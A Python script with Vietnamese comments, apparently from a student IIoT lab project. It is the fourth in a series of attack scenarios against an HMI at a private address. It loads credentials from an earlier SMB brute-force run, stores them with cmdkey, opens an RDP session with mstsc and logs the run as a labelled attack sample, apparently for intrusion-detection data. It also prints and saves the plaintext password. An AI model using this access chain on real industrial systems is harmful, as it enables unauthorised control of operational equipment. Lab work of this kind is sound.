#!/usr/bin/env python3
"""
KỊCH BẢN 4: RDP Access vào HMI .31
Chạy: python tests/test_rdp_access.py
Yêu cầu: đã có credential từ test_smb_brute.py
         HOẶC set thủ công bên dưới
"""

import json, datetime, os, subprocess, sys

# ════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════
TARGET   = "192.168.210.31"
BASE_DIR = r"C:\Users\admin\Documents\iiot\do-an"
TS       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_DIR = os.path.join(BASE_DIR, "test_results", f"rdp_access_{TS}")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ── Cách 1: đọc từ file credential của smb_brute ──
# Tìm file credential.json mới nhất trong test_results/
CREDENTIAL_FILE = None
results_dir = os.path.join(BASE_DIR, "test_results")
if os.path.isdir(results_dir):
    for folder in sorted(os.listdir(results_dir), reverse=True):
        candidate = os.path.join(results_dir, folder, "credential.json")
        if "smb_brute" in folder and os.path.exists(candidate):
            CREDENTIAL_FILE = candidate
            break

# ── Cách 2: dùng khi không tìm được file credential (hoặc smb_brute chưa
# tìm ra mật khẩu nào) — PHẢI set thật trước khi chạy, không để trống.
MANUAL_CREDENTIAL = {
    "username": "Administrator",
    "password": "",   # ← thay bằng password thật trước khi chạy
}

# ════════════════════════════════════════════════════
# BANNER
# ════════════════════════════════════════════════════
print("=" * 55)
print("  KỊCH BẢN 4: RDP ACCESS — HMI .31")
print("=" * 55)
print(f"  Target    : {TARGET}:3389")
print(f"  Thời gian : {TS}")
print(f"  Kết quả   : {OUTPUT_DIR}")
print("=" * 55)

# ════════════════════════════════════════════════════
# LẤY CREDENTIAL
# ════════════════════════════════════════════════════
found = None

if CREDENTIAL_FILE:
    with open(CREDENTIAL_FILE, "r") as f:
        found = json.load(f)
    if found:
        print(f"[+] Đọc credential từ: {CREDENTIAL_FILE}")
    else:
        found = None

if not found:
    print(f"[!] Không tìm được file credential — dùng MANUAL_CREDENTIAL")
    found = MANUAL_CREDENTIAL

print(f"[+] Username : {found['username']}")
print(f"[+] Password : {found['password']}")

if not found.get("password"):
    print("[!] Password rỗng — RDP sẽ chỉ mở màn hình đăng nhập, không tự vào được.")
    print("[!] Set MANUAL_CREDENTIAL['password'] thật trước khi chạy nếu muốn tự động login.")

# ════════════════════════════════════════════════════
# MỞ RDP
# ════════════════════════════════════════════════════
print(f"\n[*] Mở RDP vào {TARGET}:3389...")

# .rdp file không mang được password dạng plaintext — mstsc chỉ tự động
# đăng nhập nếu credential đã được lưu qua cmdkey trước đó.
if found.get("password"):
    subprocess.run(
        ["cmdkey", f"/generic:TERMSRV/{TARGET}", f"/user:{found['username']}", f"/pass:{found['password']}"],
        check=False,
    )
    print(f"[+] Đã lưu credential qua cmdkey cho TERMSRV/{TARGET}")

rdp_file = os.path.join(OUTPUT_DIR, "connect.rdp")
with open(rdp_file, "w") as f:
    f.write(
        f"full address:s:{TARGET}\n"
        f"username:s:{found['username']}\n"
        f"prompt for credentials:i:0\n"
        f"authentication level:i:2\n"
        f"enablecredsspsupport:i:1\n"
    )

subprocess.Popen(["mstsc", rdp_file])
print(f"[+] Cửa sổ RDP đang mở!")

# ════════════════════════════════════════════════════
# LƯU KẾT QUẢ
# ════════════════════════════════════════════════════
output = {
    "target"      : TARGET,
    "port"        : 3389,
    "attack_type" : "rdp_access",
    "attack_label": 1,
    "credential"  : found,
    "rdp_file"    : rdp_file,
    "status"      : "rdp_opened",
    "timestamp"   : datetime.datetime.now().isoformat(),
}

out_file = os.path.join(OUTPUT_DIR, "rdp_access_result.json")
with open(out_file, "w", encoding="utf-8") as f:
    json.dump(output, f, indent=2, ensure_ascii=False)

# ════════════════════════════════════════════════════
# TỔNG KẾT
# ════════════════════════════════════════════════════
print("\n" + "=" * 55)
print("  TỔNG KẾT RDP ACCESS")
print("=" * 55)
print(f"  Target     : {TARGET}:3389")
print(f"  Credential : {found['username']}:{found['password']}")
print(f"  RDP File   : {rdp_file}")
print(f"  Status     : ✅ RDP đã mở")
print(f"  Kết quả    : {out_file}")
print("=" * 55)
